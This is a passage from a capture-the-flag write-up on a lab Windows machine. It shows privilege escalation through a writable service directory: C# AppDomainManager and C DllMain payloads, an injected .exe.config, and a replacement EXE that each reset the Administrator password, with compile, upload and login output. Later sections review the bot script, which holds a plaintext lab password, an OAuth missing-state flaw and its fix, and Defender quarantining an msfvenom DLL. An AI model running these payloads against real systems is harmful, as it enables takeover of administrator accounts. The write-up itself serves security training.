I’ll create a DLL using C# code, compile it with `csc.exe` (whose path, `C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe`, is under `%WINDIR%\*` so it’s allowed under the AppLocker rules), and update the `.exe.config` file so that the next time the service restarts, it resets the Administrator password.

#### Create Managed DLL

The DLL called from the `.exe.config` file must be a.NET managed DLL, offering a namespace and a class that is of the type `AppDomainManager`, with the `InitializeNewDomain` function:

```cs
using System;
using System.Diagnostics;

namespace oxdfDomainManager {
    public class oxdfManager : AppDomainManager {
        public override void InitializeNewDomain(AppDomainSetup info) {
            base.InitializeNewDomain(info);
            Process.Start("cmd.exe", "/c net user Administrator 0xdf0xdf...");
        }
    }
}
```

I’ll upload it over the web, and copy it to the `Debug` directory:

```
evil-winrm-py PS C:\Program Files\Qooqle IPS Software\Failure2Ban - Prototype\Failure2Ban\bin\Debug> copy \web\eloquia\static\assets\images\blog\admin.cs .
```

And compile it:

```python
evil-winrm-py PS C:\Program Files\Qooqle IPS Software\Failure2Ban - Prototype\Failure2Ban\bin\Debug> C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /target:library admin.cs
Microsoft (R) Visual C# Compiler version 4.7.3190.0

for C# 5
Copyright (C) Microsoft Corporation. All rights reserved.

This compiler is provided as part of the Microsoft (R) .NET Framework, but only supports language versions up to C# 5, which is no longer the latest version. For compilers that support newer versions of the C# programming language, see http://go.microsoft.com/fwlink/?LinkID=533240
evil-winrm-py PS C:\Program Files\Qooqle IPS Software\Failure2Ban - Prototype\Failure2Ban\bin\Debug> ls admin.*

    Directory: C:\Program Files\Qooqle IPS Software\Failure2Ban - Prototype\Failure2Ban\bin\Debug

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----       10/14/2026   5:15 PM            334 admin.cs
-a----       10/14/2026   5:16 PM           3584 admin.dll  
```

Even though this is the 64-bit `csc.exe` and the service runs as 32-bit, the DLL will load fine, as `csc` builds “Any CPU” assemblies by default.

#### Load DLL

I’ll first back up the existing config:

```
evil-winrm-py PS C:\Program Files\Qooqle IPS Software\Failure2Ban - Prototype\Failure2Ban\bin\Debug> copy Failure2Ban.exe.config Failure2Ban.exe.config.bk
```

I’ll add the `runtime` block to the config, pointing the assembly at `admin` (for `admin.dll`, found next to the EXE), and the Manager at the namespace and class in the DLL:

```xml
<?xml version="1.0" encoding="utf-8" ?>
<configuration>
    <startup>
        <supportedRuntime version="v4.0" sku=".NETFramework,Version=v4.5" />
    </startup>
  <appSettings>
    <add key="LogFilePath" value="C:\Web\Qooqle\log.csv" />
  </appSettings>
  <runtime>
    <appDomainManagerType value="oxdfDomainManager.oxdfManager" />
    <appDomainManagerAssembly value="admin, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null" />
  </runtime>
</configuration>
```

I’ll upload this over the website and copy it into place:

```
evil-winrm-py PS C:\Program Files\Qooqle IPS Software\Failure2Ban - Prototype\Failure2Ban\bin\Debug> copy \web\eloquia\static\assets\images\blog\Failure2Ban.exe.config .
```

When the next scheduled restart occurs (less than three minutes), the Administrator password is changed:

```
oxdf@hacky$ netexec winrm eloquia.htb -u Administrator -p '0xdf0xdf...'
WINRM       10.129.244.81   5985   ELOQUIA          [*] Windows 10 / Server 2019 Build 17763 (name:ELOQUIA) (domain:Eloquia) 
WINRM       10.129.244.81   5985   ELOQUIA          [+] Eloquia\Administrator:0xdf0xdf... (Pwn3d!)
```

I’ll get a shell and the flag:

```rust
oxdf@hacky$ evil-winrm-py -i eloquia.htb -u administrator -p '0xdf0xdf...'
          _ _            _                             
  _____ _(_| |_____ __ _(_)_ _  _ _ _ __ ___ _ __ _  _ 
 / -_\ V | | |___\ V  V | | ' \| '_| '  |___| '_ | || |
 \___|\_/|_|_|    \_/\_/|_|_||_|_| |_|_|_|  | .__/\_, |
                                            |_|   |__/  v1.6.0

[*] Connecting to 'eloquia.htb:5985' as 'administrator'
evil-winrm-py PS C:\Users\Administrator\Documents> cd ..\Desktop
evil-winrm-py PS C:\Users\Administrator\Desktop> cat root.txt
4c2414ce************************
```

### DLL Hijack

With the information about the target DLL and the architecture from [above](#logfilepml), I’ll create C code for a simple DLL on my host:

```c
#include <windows.h>
#include <stdlib.h>

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)
{
    if (fdwReason == DLL_PROCESS_ATTACH) {
        system("cmd.exe /c net user Administrator new0xdfpass.");
    }
    return TRUE;
}
```

I’ll compile a 32-bit library using MinGW:

```
oxdf@hacky$ i686-w64-mingw32-gcc -shared -o hijack.dll hijack.c 
oxdf@hacky$ file hijack.dll 
hijack.dll: PE32 executable (DLL) (console) Intel 80386, for MS Windows, 18 sections
```

I’ll upload it and copy it into place:

```
evil-winrm-py PS C:\Program Files\Qooqle IPS Software\Failure2Ban - Prototype\Failure2Ban\bin\Debug> copy \web\eloquia\static\assets\images\blog\hijack.dll VERSION.dll
```

Now the next time that runs, Administrator has a new password:

```
oxdf@hacky$ netexec winrm eloquia.htb -u Administrator -p 'new0xdfpass.'
WINRM       10.129.244.81   5985   ELOQUIA          [*] Windows 10 / Server 2019 Build 17763 (name:ELOQUIA) (domain:Eloquia) 
WINRM       10.129.244.81   5985   ELOQUIA          [+] Eloquia\Administrator:new0xdfpass. (Pwn3d!)
```

And get a shell:

```rust
oxdf@hacky$ evil-winrm-py -i eloquia.htb -u administrator -p 'new0xdfpass.'
          _ _            _                             
  _____ _(_| |_____ __ _(_)_ _  _ _ _ __ ___ _ __ _  _ 
 / -_\ V | | |___\ V  V | | ' \| '_| '  |___| '_ | || |
 \___|\_/|_|_|    \_/\_/|_|_||_|_| |_|_|_|  | .__/\_, |
                                            |_|   |__/  v1.6.0

[*] Connecting to 'eloquia.htb:5985' as 'administrator'
evil-winrm-py PS C:\Users\Administrator\Documents>
```

### File Replacement

Olivia.KAT has write permissions over all the files in the `Debug` directory. A straightforward way to approach this would be to overwrite the binary. I can write other files in this directory (I show above writing a DLL and overwriting `Failure2Ban.exe.config`). The problem is that it is in use:

```
evil-winrm-py PS C:\Program Files\Qooqle IPS Software\Failure2Ban - Prototype\Failure2Ban\bin\Debug> echo "test" > Failure2Ban.exe
The process cannot access the file 'C:\Program Files\Qooqle IPS Software\Failure2Ban - Prototype\Failure2Ban\bin\Debug\Failure2Ban.exe' because it is being used by another process.
```

There is some possibility that I could create a loop that is constantly trying to copy a malicious EXE over `Failure2Ban.exe`, with the hope that it runs during the service restart. This might work if the scheduled task is stopping the service, doing something else, and then starting the service. But if it’s using `Restart-Service`, it’s much less likely to win that race.

However, if I can keep the service from starting, nothing holds the file open. On a freshly reset Eloquia instance (so the earlier `VERSION.dll` and password change aren’t in play), I’ll create an invalid config:

```
evil-winrm-py PS C:\Program Files\Qooqle IPS Software\Failure2Ban - Prototype\Failure2Ban\bin\Debug> echo "invalid" > Failure2Ban.exe.config
```

The CLR parses `Failure2Ban.exe.config` at startup, so when the service restarts, the bad XML crashes it before `Main()` runs, and nothing is left holding the file open:

```powershell
evil-winrm-py PS C:\Program Files\Qooqle IPS Software\Failure2Ban - Prototype\Failure2Ban\bin\Debug> get-process Failure2Ban

Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName                                                   
-------  ------    -----      -----     ------     --  -- -----------                                                   
    292      15    11112      14924              2052   0 Failure2Ban                                                   


evil-winrm-py PS C:\Program Files\Qooqle IPS Software\Failure2Ban - Prototype\Failure2Ban\bin\Debug> get-process Failure2Ban
Cannot find a process with the name "Failure2Ban". Verify the process name and call the cmdlet again.
```

Now I’ll create a simple EXE:

```c
#include <windows.h>
#include <stdlib.h>

int main(void)
{
    system("cmd.exe /c net user Administrator another0xdfpass.");
    return 0;
}
```

I’ll compile this:

```
oxdf@hacky$ i686-w64-mingw32-gcc replace.c -o replace.exe
```

And upload it, moving it over the now free exe:

```
evil-winrm-py PS C:\Program Files\Qooqle IPS Software\Failure2Ban - Prototype\Failure2Ban\bin\Debug> copy C:\Web\Eloquia\static\assets\images\blog\replace.exe Failure2Ban.exe
```

Within three minutes, it works:

```
oxdf@hacky$ netexec winrm eloquia.htb -u Administrator -p 'another0xdfpass.'
WINRM       10.129.244.81   5985   ELOQUIA          [*] Windows 10 / Server 2019 Build 17763 (name:ELOQUIA) (domain:Eloquia) 
WINRM       10.129.244.81   5985   ELOQUIA          [+] Eloquia\Administrator:another0xdfpass. (Pwn3d!)
```

It doesn’t matter that this isn’t a.NET binary, or even a real service. The Service Control Manager will start any executable, and while it kills the process after it fails to check in as a service, the `net user` command has already run. From here I can get a shell and the flag.

## Beyond Root

### Bot Cookie Mistake

In the [foothold](#via-cookie-theft), I was able to steal the admin user’s cookie using XSS, despite the fact that the site sets it as `httponly`. It turns out, the bot’s cookie isn’t saved that way due to an oddity in how the author / HTB wrote the bot script. The full script is available at `C:\program files\automation scripts\seleniumSimulator.py`:

```python
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.keys import Keys
import time
import requests
from bs4 import BeautifulSoup

session = requests.Session()

login_url = "http://eloquia.htb/accounts/login/"
response = session.get(login_url)

soup = BeautifulSoup(response.text, "html.parser")
csrf_token = soup.find("input", {"name": "csrfmiddlewaretoken"})["value"]

payload = {
    "username": "admin",
    "password": "MyEl0qu!@Admin",
    "csrfmiddlewaretoken": csrf_token
    }

post_response = session.post(
    login_url,
    data=payload
    )

session_cookie = session.cookies.get("sessionid")

# Create a new instance of the Chrome driver
chrome_options = Options()
chrome_options.add_argument('--headless')
driver = webdriver.Chrome(options=chrome_options)

response = requests.get("http://eloquia.htb/api/get/reported_articles/")
driver.get(f"http://eloquia.htb/api/get/reported_articles/") # just to set the domain cookie
driver.add_cookie({"name": "sessionid", "value": session_cookie})

for id in str(response.text).split('\n')[:-1]:
    driver.get(f"http://eloquia.htb/article/visit/{id}/")
    button = driver.find_element(by='name', value="report-article")
    button.send_keys(Keys.NULL)
    autofocus_elements = driver.find_elements(by='css selector', value='[autofocus]')
    for element in autofocus_elements:
        try:
            element.send_keys(Keys.NULL)
        except:
            pass

    # Wait for the XSS payload to execute (adjust the delay as needed)
    time.sleep(3)

# Close the browser
driver.quit()
```

For some reason, the bot uses a mix of Python `requests` and Selenium. It starts using `requests` to log into the site:

```python
session = requests.Session()

login_url = "http://eloquia.htb/accounts/login/"
response = session.get(login_url)

soup = BeautifulSoup(response.text, "html.parser")
csrf_token = soup.find("input", {"name": "csrfmiddlewaretoken"})["value"]

payload = {
    "username": "admin",
    "password": "MyEl0qu!@Admin",
    "csrfmiddlewaretoken": csrf_token
    }

post_response = session.post(
    login_url,
    data=payload
    )
```

Then it adds that cookie to a `selenium` session:

```python
session_cookie = session.cookies.get("sessionid")

# Create a new instance of the Chrome driver
chrome_options = Options()
chrome_options.add_argument('--headless')
driver = webdriver.Chrome(options=chrome_options)

response = requests.get("http://eloquia.htb/api/get/reported_articles/")
driver.get(f"http://eloquia.htb/api/get/reported_articles/") # just to set the domain cookie
driver.add_cookie({"name": "sessionid", "value": session_cookie})
```

When it adds that cookie, it doesn’t set any flags, so `httponly` defaults to off. That means JavaScript in the headless browser can read the full cookie. It’s not at all clear to me why the bot didn’t just use Selenium the entire time.

I’ll also note that for each reported ID, it calls:

```python
autofocus_elements = driver.find_elements(by='css selector', value='[autofocus]')
```

That shows why the `autofocus` attribute triggers the event.

### OAuth Configuration

#### Code Expiration Time

I spent some time trying to manually start the OAuth flow, then send the URL to the admin using the AngularJS injection, but it never worked. It turns out that it was constantly getting the `{"error": "invalid_grant"}` error I showed when I moved too slowly [exploiting myself](#via-manual-oauth-hijack-fail).

The Qooqle application is configured in `C:\Web\Qooqle\Qooqle\settings.py`. One item in this file is a list of apps the application uses:

```
INSTALLED_APPS = [
    'django.contrib.admin',
    'django.contrib.auth',
    'django.contrib.contenttypes',
    'django.contrib.sessions',
    'django.contrib.messages',
    'django.contrib.staticfiles',
    'Qooqle',
    'oauth2_provider',
]     
```

`oauth2_provider` is the import name for the [Django OAuth Toolkit](https://django-oauth-toolkit.readthedocs.io/en/latest/) (DOT). Later in `settings.py` it configures DOT:

```python
OAUTH2_PROVIDER = {
    'PKCE_REQUIRED': False,
    'AUTHORIZATION_CODE_EXPIRE_SECONDS': 15,
}
```

DOT’s [default](https://django-oauth-toolkit.readthedocs.io/en/latest/settings.html#authorization-code-expire-seconds) is 60 seconds, but Qooqle sets this to 15 seconds, which makes it impossible to pull off manually. I think 15 is probably pretty unrealistic for something I would find in the real world. On the other hand, being able to pull off this attack in 60 seconds is also pretty unrealistic with a real human on the other end, so setting it arbitrarily low may actually make this more realistic.

#### Missing State

The OAuth hijack works because of how Eloquia (the OAuth client) handles the flow in `C:\Web\Eloquia\Eloquia\views.py`. The authorize view builds the redirect to Qooqle without any `state` parameter:

```python
def qooqle_oauth2_authorize(request):
    #code_verifier = ''.join(choice(string.ascii_uppercase + string.digits) for _ in range(randint(43, 128)))
    # Store the code_verifier in the user's session or a temporary token
    # request.session['code_verifier'] = code_verifier
    # code_challenge = sha256(code_verifier.encode('utf-8')).digest()
    # code_challenge = urlsafe_b64encode(code_challenge).decode('utf-8').replace('=', '')
    authorization_url = f'{Qooqle_OAUTH2_URL}authorize/?client_id={CLIENT_ID}&response_type=code&redirect_uri={REDIRECT_URI}'
    return redirect(authorization_url)
```

The commented out lines are PKCE, which would have tied the code to the session that started the flow. With that disabled here (and `PKCE_REQUIRED` set to `False` on Qooqle), and no `state` generated, there’s nothing linking a callback to the browser that started it.

The callback view takes any `code`, exchanges it for a token, and gets the email of the Qooqle account. It then calls `qooqle_oauth2_connect_account`:

```python
def qooqle_oauth2_connect_account(request, email: str):
    if request.user.is_authenticated:
        # Connect the current logged in user with this account
        #check if this email is connected with another account
        connected_account = CustomUser.objects.filter(qooqle_connected_account=email)
        if connected_account.exists():
            connected_account = connected_account.get()
            #disconnect this account
            connected_account.qooqle_connected_account = None
            connected_account.save()
        request.user.qooqle_connected_account = email
        request.user.save()
        return True
```

If the user visiting the callback is logged in, their account gets linked to the Qooqle email from the code, no matter who started the flow. So when the admin’s browser loads my callback URL, the admin account is linked to my Qooqle account. It also unlinks that Qooqle account from my own Eloquia account, which is why logging in with Qooqle afterwards lands on admin.

The fix is to generate a random `state` in the authorize view, store it in the session, and reject any callback where the returned `state` doesn’t match (or re-enable the PKCE code above, which also checks against the session).

### msfvenom DLLs and Defender

Rather than make my own DLLs, I had started just using `msfvenom`, but it didn’t work. I was able to get a message back showing that it was Defender quarantining the files. I’ll confirm this with my Administrator shell. I can upload the DLL just fine:

```
evil-winrm-py PS C:\web\Eloquia\static\assets\images\blog> ls rev.dll

    Directory: C:\web\Eloquia\static\assets\images\blog

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----       10/12/2026  10:09 AM           9216 rev.dll  
```

However, when I try to load it via the SQLExplorer, it disappears:

```
evil-winrm-py PS C:\web\Eloquia\static\assets\images\blog> ls rev.dll
Cannot find path 'C:\web\Eloquia\static\assets\images\blog\rev.dll' because it does not exist.
```

I’ll check the Defender logs, and confirm this is what’s happening:

```rust
evil-winrm-py PS C:\web\Eloquia\static\assets\images\blog> Get-MpThreatDetection | select InitialDetectionTime, ThreatID, ActionSuccess, @{n='Files';e={$_.Resources -join ', '}} | fl

InitialDetectionTime : 10/12/2026 10:04:25 AM
ThreatID             : 2147721833
ActionSuccess        : True
Files                : file:_C:\Web\Eloquia\static\assets\images\blog\rev.dll

InitialDetectionTime : 10/12/2026 10:05:08 AM
ThreatID             : 2147721833
ActionSuccess        : True
Files                : file:_C:\Web\Eloquia\static\assets\images\blog\rev.dll

InitialDetectionTime : 10/12/2026 10:09:33 AM
ThreatID             : 2147721833
ActionSuccess        : True
Files                : file:_C:\Web\Eloquia\static\assets\images\blog\rev.dll
```
